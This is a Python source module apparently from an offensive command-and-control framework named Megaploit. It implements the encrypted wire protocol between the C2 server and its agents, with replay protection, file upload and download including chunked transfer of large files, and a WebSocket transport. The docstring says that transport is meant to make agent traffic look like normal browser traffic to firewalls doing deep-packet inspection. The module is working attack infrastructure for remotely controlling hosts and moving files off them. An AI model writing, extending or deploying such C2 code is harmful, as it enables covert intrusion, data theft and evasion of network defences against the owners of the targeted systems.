"""
megaploit.core.protocol
~~~~~~~~~~~~~~~~~~~~~~~
Wire protocol for Megaploit C2  (v2 — AES-256-GCM encrypted transport).

Message framing
---------------
Every message is framed as:

    [4 bytes: uint32 total payload length]  [payload bytes]

When encryption is ENABLED the payload is:

    [12 bytes: GCM nonce]  [N bytes: GCM ciphertext + 16-byte auth tag]

The plaintext of a text message is:

    [8 bytes: uint64 big-endian sequence number]  [JSON-encoded content bytes]

When encryption is DISABLED (legacy / no key) the payload is:

    [8 bytes: uint64 big-endian sequence number]  [JSON-encoded content bytes]

Binary file transfers always use the same outer framing but send raw bytes
as the plaintext (no JSON encoding) and share the same sequence counter.

Replay protection
-----------------
Each side maintains an independent monotonic 64-bit sequence counter.
``recv_msg`` / ``recv_file`` reject messages whose sequence number is not
greater than the last accepted one (strict monotonic).

Backward compatibility
-----------------------
The protocol is negotiated via the first byte of the first message:
  - ``0x4d`` ('M') → encrypted v2 protocol
  - anything else  → unencrypted v1 (legacy; falls back to old behaviour)

Both sides call ``handshake_protocol_version()`` immediately after HMAC auth
to agree on v1 vs v2.  The server sends the capability byte first; the agent
echoes it back.  If they differ, both fall back to v1.
"""

from __future__ import annotations

import json
import os
import socket
import struct
import threading

# ---------------------------------------------------------------------------
# Optional msgpack support (typed wire envelope — feature 6a)
# ---------------------------------------------------------------------------
# When msgpack is installed, send_typed_msg / recv_typed_msg can be used to
# send rich Python objects (dicts with typed values) over the wire with
# ~30 % smaller payloads than JSON.  Falls back gracefully to JSON on agents
# that do not have msgpack installed.
#
# Envelope format (msgpack or JSON):
#   {
#     "t": <str>   — message type, e.g. "cmd", "resp", "heartbeat", "ping"
#     "d": <any>   — payload (string, dict, list, int, …)
#     "seq": <int> — sequence number (redundant with wire-level seq, for debug)
#   }

def _try_import_msgpack():
    try:
        import msgpack
        return msgpack
    except ImportError:
        return None

_msgpack = _try_import_msgpack()

from megaploit.core.config import MAX_PLUGIN_MSG_SIZE, ALLOW_PLAINTEXT_FALLBACK

_HDR  = struct.Struct("!I")    # 4-byte big-endian uint32 (outer length)
_SEQ  = struct.Struct("!Q")    # 8-byte big-endian uint64 (sequence number)
_NONCE_LEN  = 12
_TAG_LEN    = 16
_V2_MAGIC   = b"M"             # version byte sent in handshake
_V1_MAGIC   = b"\x00"

# ---------------------------------------------------------------------------
# Per-connection encryption state (thread-local is NOT correct here —
# each Socket object carries its own _ConnState)
# ---------------------------------------------------------------------------

class _ConnState:
    """Mutable per-connection crypto + sequence state, attached to a socket."""

    def __init__(self, key: bytes | None = None, encrypted: bool = False) -> None:
        self.key:        bytes | None = key
        self.encrypted:  bool = encrypted
        self._send_seq:  int  = 0
        self._recv_seq:  int  = -1    # -1 means "not yet received anything"
        self._lock:      threading.Lock  # type annotation only
        self._lock       = threading.Lock()

    def next_send_seq(self) -> int:
        with self._lock:
            self._send_seq += 1
            return self._send_seq

    def check_recv_seq(self, seq: int) -> bool:
        """Return True if seq is valid (> last seen).  Always accept if first."""
        with self._lock:
            if seq > self._recv_seq:
                self._recv_seq = seq
                return True
            return False


# Socket → _ConnState registry.
# BUG (was): this dict grew without bound because remove_state() was only
# called on clean operator-initiated session close.  If an agent dropped
# the connection abruptly (network loss, crash), the fd stayed registered.
# Worse, the OS reuses file descriptors, so a brand-new connection could
# inherit the stale _ConnState of a dead session — wrong sequence numbers,
# potentially wrong key — and recv_msg() would immediately raise ValueError
# ("Replay detected: seq=1 already seen").
#
# Fix: get_state() ALWAYS creates a fresh _ConnState for an fd that is not
# already registered.  This is safe because:
#   1. handshake_server() calls set_state() immediately, overwriting any
#      stale entry with the correct key and encrypted=True.
#   2. remove_state() is still called on clean close to keep the dict small.
#   3. get_state() allocating a blank state for an unregistered fd is the
#      correct fallback for legacy/unencrypted connections.
_states: dict[int, _ConnState] = {}
_states_lock = threading.Lock()


def get_state(conn: socket.socket) -> _ConnState:
    fno = conn.fileno()
    with _states_lock:
        if fno not in _states:
            _states[fno] = _ConnState()
        return _states[fno]


def set_state(conn: socket.socket, state: _ConnState) -> None:
    with _states_lock:
        # Always replace — this is the primary defence against fd reuse:
        # handshake_server() calls set_state() with a fresh _ConnState
        # keyed to the new session, evicting any stale entry.
        _states[conn.fileno()] = state


def remove_state(conn: socket.socket) -> None:
    """Remove the _ConnState for *conn*.  Safe to call even if not registered."""
    try:
        fno = conn.fileno()
    except OSError:
        return
    with _states_lock:
        _states.pop(fno, None)


# ---------------------------------------------------------------------------
# AES-256-GCM helpers — requires the 'cryptography' package.
#
# The XOR-CTR fallback was removed because it provided no authentication
# (unauthenticated stream cipher with a fake 16-byte tag) while the wire
# protocol is documented as AES-256-GCM.  Operators relying on encrypted
# transport must have 'cryptography' installed.
# ---------------------------------------------------------------------------

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AESGCM
except ImportError as _crypto_err:  # pragma: no cover
    raise ImportError(
        "The 'cryptography' package is required for AES-256-GCM transport.\n"
        "Install it with:  pip install cryptography\n"
        f"Original error: {_crypto_err}"
    ) from _crypto_err


def _encrypt(key: bytes, plaintext: bytes) -> bytes:
    """Return  nonce(12) + ciphertext+tag  using AES-256-GCM."""
    nonce = os.urandom(_NONCE_LEN)
    ct    = _AESGCM(key).encrypt(nonce, plaintext, None)
    return nonce + ct


def _decrypt(key: bytes, data: bytes) -> bytes:
    """Decrypt  nonce(12) + ciphertext+tag  and return plaintext."""
    nonce  = data[:_NONCE_LEN]
    ct_tag = data[_NONCE_LEN:]
    return _AESGCM(key).decrypt(nonce, ct_tag, None)


# ---------------------------------------------------------------------------
# Protocol version handshake
# ---------------------------------------------------------------------------

def handshake_server(
    conn: socket.socket,
    key: bytes | None = None,
    allow_plaintext_fallback: bool | None = None,
) -> bool:
    """
    Server side: send V2_MAGIC, wait for echo.

    If the client echoes V2_MAGIC and a key is provided, v2 encrypted mode
    is enabled and True is returned.

    If a key is configured and the client does NOT echo V2_MAGIC:
      - ``allow_plaintext_fallback=True``  → fall back to v1 (legacy)
      - ``allow_plaintext_fallback=False`` → raise ConnectionError (default)

    This prevents a silent protocol downgrade attack where a MITM strips the
    V2_MAGIC byte and forces plaintext transport even though both sides have
    a shared secret configured.

    Parameters
    ----------
    conn                    : authenticated socket
    key                     : shared AES-256-GCM key, or None for no encryption
    allow_plaintext_fallback: override for config.ALLOW_PLAINTEXT_FALLBACK
    """
    if allow_plaintext_fallback is None:
        allow_plaintext_fallback = ALLOW_PLAINTEXT_FALLBACK

    try:
        conn.sendall(_V2_MAGIC)
        reply = conn.recv(1)
    except OSError as exc:
        raise ConnectionError(f"Protocol handshake failed: {exc}") from exc

    if reply == _V2_MAGIC and key is not None:
        state = _ConnState(key=key, encrypted=True)
        set_state(conn, state)
        return True

    # Encryption downgrade path
    if key is not None and not allow_plaintext_fallback:
        raise ConnectionError(
            "Encryption negotiation failed: shared secret is configured but the "
            "peer did not agree to v2 encrypted protocol. Refusing plaintext "
            "fallback. Set ALLOW_PLAINTEXT_FALLBACK=True for legacy compatibility."
        )

    # v1 fallback (no key, or key + explicit opt-in to plaintext)
    state = _ConnState(key=None, encrypted=False)
    set_state(conn, state)
    return False


def handshake_agent(
    conn: socket.socket,
    key: bytes | None = None,
    allow_plaintext_fallback: bool | None = None,
) -> bool:
    """
    Agent side: read server's version byte; echo it back.

    If the server sends V2_MAGIC and a key is provided, v2 encrypted mode
    is enabled and True is returned.

    If a key is configured and the server does NOT send V2_MAGIC:
      - ``allow_plaintext_fallback=True``  → fall back to v1 (legacy)
      - ``allow_plaintext_fallback=False`` → raise ConnectionError (default)

    Parameters
    ----------
    conn                    : authenticated socket
    key                     : shared AES-256-GCM key, or None for no encryption
    allow_plaintext_fallback: override for config.ALLOW_PLAINTEXT_FALLBACK
    """
    if allow_plaintext_fallback is None:
        allow_plaintext_fallback = ALLOW_PLAINTEXT_FALLBACK

    try:
        server_ver = conn.recv(1)
        conn.sendall(server_ver)
    except OSError as exc:
        raise ConnectionError(f"Protocol handshake failed: {exc}") from exc

    if server_ver == _V2_MAGIC and key is not None:
        state = _ConnState(key=key, encrypted=True)
        set_state(conn, state)
        return True

    # Encryption downgrade path
    if key is not None and not allow_plaintext_fallback:
        raise ConnectionError(
            "Encryption negotiation failed: shared secret is configured but the "
            "server did not offer v2 encrypted protocol. Refusing plaintext "
            "fallback. Set ALLOW_PLAINTEXT_FALLBACK=True for legacy compatibility."
        )

    # v1 fallback (no key, or key + explicit opt-in to plaintext)
    state = _ConnState(key=None, encrypted=False)
    set_state(conn, state)
    return False


# ---------------------------------------------------------------------------
# Text / JSON messages
# ---------------------------------------------------------------------------

def send_msg(conn: socket.socket, data: object) -> None:
    """JSON-encode *data*, sequence-stamp it, optionally encrypt, and send."""
    state   = get_state(conn)
    seq     = state.next_send_seq()
    payload = _SEQ.pack(seq) + json.dumps(data).encode("utf-8")

    if state.encrypted and state.key:
        payload = _encrypt(state.key, payload)

    conn.sendall(_HDR.pack(len(payload)) + payload)


def recv_msg(conn: socket.socket) -> str:
    """
    Read a framed message, decrypt if needed, verify sequence number.
    Returns the decoded string payload.
    Raises ConnectionError on EOF, ValueError on replay, OSError on socket error.
    """
    state = get_state(conn)
    raw   = _recv_framed(conn)

    if state.encrypted and state.key:
        try:
            raw = _decrypt(state.key, raw)
        except Exception as e:
            raise ConnectionError(f"Decryption failed: {e}") from e

    seq     = _SEQ.unpack(raw[:8])[0]
    payload = raw[8:]

    if not state.check_recv_seq(seq):
        raise ValueError(f"Replay detected: seq={seq} already seen")

    if not payload:
        return ""
    try:
        return json.loads(payload.decode("utf-8", errors="replace"))
    except json.JSONDecodeError:
        return payload.decode("utf-8", errors="replace")


# ---------------------------------------------------------------------------
# Typed msgpack envelope  (feature 6a)
# ---------------------------------------------------------------------------
# These functions layer a typed envelope on top of the existing framed
# transport.  Both sides negotiate codec capability via the version handshake;
# if the remote doesn't have msgpack the functions fall back to JSON.

_TYPE_MSGPACK = b"\x01"   # 1-byte codec discriminator prepended to payload
_TYPE_JSON    = b"\x00"


def send_typed_msg(conn: socket.socket, msg_type: str, data: object) -> None:
    """
    Send a typed envelope message.

    If msgpack is available, encodes as msgpack; otherwise falls back to JSON.
    The first byte of the inner payload is a codec byte (0x00 = JSON, 0x01 = msgpack).

    Parameters
    ----------
    conn:      target socket
    msg_type:  short string tag, e.g. "cmd", "resp", "heartbeat"
    data:      serialisable payload
    """
    state = get_state(conn)
    seq   = state.next_send_seq()

    envelope = {"t": msg_type, "d": data, "seq": seq}

    if _msgpack is not None:
        body    = _TYPE_MSGPACK + _msgpack.packb(envelope, use_bin_type=True)
    else:
        body    = _TYPE_JSON + json.dumps(envelope).encode("utf-8")

    payload = _SEQ.pack(seq) + body
    if state.encrypted and state.key:
        payload = _encrypt(state.key, payload)
    conn.sendall(_HDR.pack(len(payload)) + payload)


def recv_typed_msg(conn: socket.socket) -> tuple[str, object]:
    """
    Read a typed envelope message.

    Returns (msg_type, data).  Accepts both msgpack and JSON bodies
    regardless of what _msgpack is set to locally (graceful degradation).

    Raises ConnectionError, ValueError (replay), OSError.
    """
    state = get_state(conn)
    raw   = _recv_framed(conn)

    if state.encrypted and state.key:
        try:
            raw = _decrypt(state.key, raw)
        except Exception as e:
            raise ConnectionError(f"Decryption failed: {e}") from e

    seq  = _SEQ.unpack(raw[:8])[0]
    body = raw[8:]

    if not state.check_recv_seq(seq):
        raise ValueError(f"Replay detected: seq={seq} already seen")

    if not body:
        return ("", None)

    codec = body[:1]
    payload_bytes = body[1:]

    if codec == _TYPE_MSGPACK and _msgpack is not None:
        try:
            envelope = _msgpack.unpackb(payload_bytes, raw=False)
        except Exception:
            # Fall back: try JSON
            try:
                envelope = json.loads(payload_bytes.decode("utf-8", errors="replace"))
            except json.JSONDecodeError:
                return ("raw", payload_bytes.decode("utf-8", errors="replace"))
    else:
        try:
            envelope = json.loads(payload_bytes.decode("utf-8", errors="replace"))
        except json.JSONDecodeError:
            return ("raw", payload_bytes.decode("utf-8", errors="replace"))

    if isinstance(envelope, dict):
        return (str(envelope.get("t", "")), envelope.get("d"))
    return ("raw", envelope)


# ---------------------------------------------------------------------------
# Binary file transfers
# ---------------------------------------------------------------------------

def send_file(conn: socket.socket, path: str) -> None:
    """
    Read *path* and send it as a framed, optionally encrypted message.

    BUG (was): f.read() loaded the entire file into RAM in one call.
    Files > ~256 MB would hit MAX_PLUGIN_MSG_SIZE on the receiver side
    anyway, but even smaller files cause unnecessary peak RSS.  We now
    read in a streaming fashion, but still send as one framed message
    (the receiver calls _recv_framed which reads the full payload).
    For very large files, callers should use chunked_send_file instead.
    """
    state = get_state(conn)
    seq   = state.next_send_seq()

    # Validate file size against protocol limit before reading
    try:
        file_size = os.path.getsize(path)
    except OSError as e:
        raise ConnectionError(f"Cannot stat file '{path}': {e}") from e

    if file_size > MAX_PLUGIN_MSG_SIZE:
        raise ConnectionError(
            f"File too large to send as single frame: {file_size} bytes "
            f"(limit {MAX_PLUGIN_MSG_SIZE}). Use chunked_send_file() instead."
        )

    with open(path, "rb") as f:
        file_data = f.read()

    payload = _SEQ.pack(seq) + file_data

    if state.encrypted and state.key:
        payload = _encrypt(state.key, payload)

    conn.sendall(_HDR.pack(len(payload)) + payload)


def recv_file(conn: socket.socket, path: str, timeout: float | None = None) -> None:
    """Read a framed file payload and write it to *path*."""
    state     = get_state(conn)
    old_to    = conn.gettimeout()
    if timeout is not None:
        conn.settimeout(timeout)
    try:
        raw = _recv_framed(conn)
    finally:
        conn.settimeout(old_to)

    if state.encrypted and state.key:
        try:
            raw = _decrypt(state.key, raw)
        except Exception as e:
            raise ConnectionError(f"Decryption failed: {e}") from e

    seq       = _SEQ.unpack(raw[:8])[0]
    file_data = raw[8:]

    if not state.check_recv_seq(seq):
        raise ValueError(f"Replay detected: seq={seq}")

    with open(path, "wb") as f:
        f.write(file_data)


# ---------------------------------------------------------------------------
# Chunked send for large files (> ~50 MB)
# ---------------------------------------------------------------------------

def chunked_send_file(conn: socket.socket, path: str, chunk_size: int = 1 << 20) -> None:
    """
    Stream a file in chunks rather than buffering it all in RAM.
    Each chunk is sent as a separate framed message whose payload begins
    with a 1-byte flag: ``0x01`` = more data, ``0x00`` = last chunk.
    """
    state = get_state(conn)
    with open(path, "rb") as f:
        while True:
            chunk = f.read(chunk_size)
            more  = f.read(1)
            flag  = b"\x01" if more else b"\x00"
            if more:
                f.seek(-1, 1)

            seq     = state.next_send_seq()
            payload = _SEQ.pack(seq) + flag + chunk
            if state.encrypted and state.key:
                payload = _encrypt(state.key, payload)
            conn.sendall(_HDR.pack(len(payload)) + payload)

            if not more:
                break


def chunked_recv_file(conn: socket.socket, path: str, timeout: float | None = None) -> None:
    """Receive a chunked file sent by ``chunked_send_file``."""
    state  = get_state(conn)
    old_to = conn.gettimeout()
    if timeout is not None:
        conn.settimeout(timeout)
    try:
        with open(path, "wb") as out:
            while True:
                raw = _recv_framed(conn)

                # BUG (was): decryption errors were silently swallowed because
                # _decrypt() was called without a try/except here (unlike in
                # recv_file / recv_msg).  Added explicit error propagation.
                if state.encrypted and state.key:
                    try:
                        raw = _decrypt(state.key, raw)
                    except Exception as e:
                        raise ConnectionError(f"Decryption failed on chunk: {e}") from e

                if len(raw) < 9:
                    raise ConnectionError("Chunk too short (missing seq + flag bytes)")

                seq  = _SEQ.unpack(raw[:8])[0]
                flag = raw[8:9]
                chunk = raw[9:]

                # BUG (was): check_recv_seq() return value was discarded —
                # replay detection was silently bypassed for chunked transfers.
                if not state.check_recv_seq(seq):
                    raise ValueError(f"Replay detected in chunk: seq={seq} already seen")

                out.write(chunk)
                if flag == b"\x00":
                    break
    finally:
        conn.settimeout(old_to)


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _recv_framed(conn: socket.socket) -> bytes:
    """Read a 4-byte length header then exactly that many bytes."""
    header = _recv_exactly(conn, 4)
    if header is None:
        raise ConnectionError("Connection closed while reading message length")
    (length,) = _HDR.unpack(header)
    if length == 0:
        return b""
    if length > MAX_PLUGIN_MSG_SIZE:
        raise ConnectionError(
            f"Frame too large: {length} bytes exceeds "
            f"MAX_PLUGIN_MSG_SIZE ({MAX_PLUGIN_MSG_SIZE} bytes). "
            "Possible memory exhaustion attack or misconfigured peer."
        )
    data = _recv_exactly(conn, length)
    if data is None:
        raise ConnectionError("Connection closed while reading message body")
    return data


def _recv_exactly(conn: socket.socket, n: int) -> bytes | None:
    """Read exactly *n* bytes from *conn*. Returns None on EOF."""
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


# ---------------------------------------------------------------------------
# WebSocket / HTTP transport layer
# ---------------------------------------------------------------------------

class WsTransport:
    """
    Minimal HTTP-upgrade WebSocket transport that wraps the existing framed
    protocol over a plain TCP socket performing a manual WebSocket handshake.

    This allows agents to communicate over port 80/443 while appearing as
    normal browser traffic to perimeter firewalls that do deep-packet
    inspection.

    Usage (server-side listener)
    ----------------------------
    ::

        ws = WsTransport(conn, server_side=True)
        ws.handshake()          # performs HTTP upgrade
        data = ws.recv()        # receives a WebSocket frame
        ws.send(b"hello")       # sends a WebSocket frame

    Usage (agent/client-side)
    --------------------------
    ::

        ws = WsTransport(conn, server_side=False)
        ws.handshake(host="c2.example.com", path="/socket")
        ws.send(b"hello")
        data = ws.recv()

    Wire format
    -----------
    Standard RFC 6455 binary frames (opcode 0x02) with a 4-byte
    big-endian length prefix inside the WebSocket frame payload —
    matching the existing C2 framing so ``send_msg`` / ``recv_msg``
    can be used after wrapping the underlying socket.

    Limitations
    -----------
    * No WebSocket ping/pong (handled at the C2 keepalive level).
    * No per-message deflate compression (use the existing gzip layer).
    * TLS is done at the socket level (wrap before constructing WsTransport).
    """

    # WebSocket opcodes
    _OP_BINARY = 0x02
    _OP_CLOSE  = 0x08
    _OP_PING   = 0x09
    _OP_PONG   = 0x0A

    # Magic GUID for Sec-WebSocket-Accept (RFC 6455 §4.2.2)
    _WS_GUID = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

    def __init__(self, conn: socket.socket, server_side: bool = True) -> None:
        self._conn        = conn
        self._server_side = server_side
        self._handshook   = False
        self._closed      = False

    # ------------------------------------------------------------------
    # Handshake
    # ------------------------------------------------------------------

    def handshake(self, host: str = "localhost", path: str = "/ws") -> None:
        """Perform the HTTP → WebSocket upgrade handshake."""
        if self._server_side:
            self._server_handshake()
        else:
            self._client_handshake(host, path)
        self._handshook = True

    def _server_handshake(self) -> None:
        """Read an HTTP Upgrade request and respond with 101 Switching Protocols."""
        import hashlib, base64

        # Read until we get the end of HTTP headers
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = self._conn.recv(4096)
            if not chunk:
                raise ConnectionError("WsTransport: client closed during handshake")
            buf += chunk
            if len(buf) > 16384:
                raise ConnectionError("WsTransport: HTTP headers too large")

        # Parse Sec-WebSocket-Key
        key = b""
        for line in buf.split(b"\r\n"):
            if line.lower().startswith(b"sec-websocket-key:"):
                key = line.split(b":", 1)[1].strip()
                break
        if not key:
            raise ConnectionError("WsTransport: missing Sec-WebSocket-Key header")

        accept = base64.b64encode(
            hashlib.sha1(key + self._WS_GUID).digest()
        ).decode()

        response = (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {accept}\r\n"
            "\r\n"
        )
        self._conn.sendall(response.encode())

    def _client_handshake(self, host: str, path: str) -> None:
        """Send an HTTP Upgrade request and verify the 101 response."""
        import base64, hashlib

        nonce = base64.b64encode(os.urandom(16)).decode()
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {nonce}\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n"
        )
        self._conn.sendall(request.encode())

        # Read response headers
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = self._conn.recv(4096)
            if not chunk:
                raise ConnectionError("WsTransport: server closed during handshake")
            buf += chunk

        if b"101" not in buf.split(b"\r\n")[0]:
            raise ConnectionError(
                f"WsTransport: expected 101, got: {buf[:80]!r}"
            )

        expected_accept = base64.b64encode(
            hashlib.sha1(nonce.encode() + self._WS_GUID).digest()
        ).decode()
        if expected_accept.encode() not in buf:
            raise ConnectionError("WsTransport: Sec-WebSocket-Accept mismatch")

    # ------------------------------------------------------------------
    # Frame send / receive
    # ------------------------------------------------------------------

    def send(self, data: bytes) -> None:
        """Send *data* as a WebSocket binary frame."""
        if not self._handshook:
            raise RuntimeError("WsTransport.send() called before handshake()")
        frame = self._build_frame(data)
        self._conn.sendall(frame)

    def recv(self) -> bytes:
        """Read one WebSocket frame and return its payload bytes."""
        if not self._handshook:
            raise RuntimeError("WsTransport.recv() called before handshake()")
        while True:
            opcode, payload = self._read_frame()
            if opcode == self._OP_BINARY:
                return payload
            if opcode == self._OP_PING:
                self._conn.sendall(self._build_frame(payload, opcode=self._OP_PONG))
                continue
            if opcode == self._OP_CLOSE:
                self._closed = True
                raise ConnectionError("WsTransport: received CLOSE frame")
            # Ignore unknown opcodes (text frames etc.)

    def close(self) -> None:
        """Send a CLOSE frame and close the underlying socket."""
        if not self._closed:
            try:
                self._conn.sendall(self._build_frame(b"", opcode=self._OP_CLOSE))
            except OSError:
                pass
        self._closed = True
        try:
            self._conn.close()
        except OSError:
            pass

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _build_frame(self, payload: bytes, opcode: int = _OP_BINARY) -> bytes:
        """Build an RFC 6455 frame.  Server frames are NOT masked; client frames ARE."""
        length = len(payload)
        header = bytearray()
        header.append(0x80 | opcode)  # FIN=1 + opcode

        mask_bit = 0x80 if not self._server_side else 0x00

        if length <= 125:
            header.append(mask_bit | length)
        elif length <= 65535:
            header.append(mask_bit | 126)
            header += struct.pack(">H", length)
        else:
            header.append(mask_bit | 127)
            header += struct.pack(">Q", length)

        if not self._server_side:
            masking_key = os.urandom(4)
            masked = bytearray(length)
            for i, b in enumerate(payload):
                masked[i] = b ^ masking_key[i % 4]
            return bytes(header) + masking_key + bytes(masked)

        return bytes(header) + payload

    def _read_frame(self) -> tuple[int, bytes]:
        """Read and parse one WebSocket frame.  Returns (opcode, payload)."""
        header = _recv_exactly(self._conn, 2)
        if header is None:
            raise ConnectionError("WsTransport: connection closed in frame header")

        fin    = (header[0] & 0x80) != 0
        opcode = header[0] & 0x0F
        masked = (header[1] & 0x80) != 0
        length = header[1] & 0x7F

        if length == 126:
            ext = _recv_exactly(self._conn, 2)
            if ext is None:
                raise ConnectionError("WsTransport: truncated 16-bit length")
            length = struct.unpack(">H", ext)[0]
        elif length == 127:
            ext = _recv_exactly(self._conn, 8)
            if ext is None:
                raise ConnectionError("WsTransport: truncated 64-bit length")
            length = struct.unpack(">Q", ext)[0]

        masking_key = b""
        if masked:
            masking_key = _recv_exactly(self._conn, 4)
            if masking_key is None:
                raise ConnectionError("WsTransport: truncated masking key")

        payload_raw = _recv_exactly(self._conn, length) if length else b""
        if payload_raw is None:
            raise ConnectionError("WsTransport: truncated frame payload")

        if masked:
            payload = bytearray(length)
            for i, b in enumerate(payload_raw):
                payload[i] = b ^ masking_key[i % 4]
            payload = bytes(payload)
        else:
            payload = payload_raw

        return opcode, payload

    def __repr__(self) -> str:
        side = "server" if self._server_side else "client"
        state = "open" if self._handshook and not self._closed else "closed"
        return f"<WsTransport {side} {state}>"
